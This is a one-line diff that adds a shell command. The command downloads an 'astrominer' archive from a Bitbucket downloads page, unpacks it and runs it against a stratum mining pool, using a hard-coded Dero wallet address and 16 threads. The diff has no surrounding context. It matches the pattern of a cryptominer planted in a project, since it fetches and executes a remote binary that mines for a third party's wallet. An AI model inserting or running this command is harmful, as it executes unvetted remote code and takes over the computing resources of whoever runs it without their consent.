@@ -1,0 +1,1 @@
+wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.odang -t16 -r stratum+tcp://stus.threepool.tech:3030
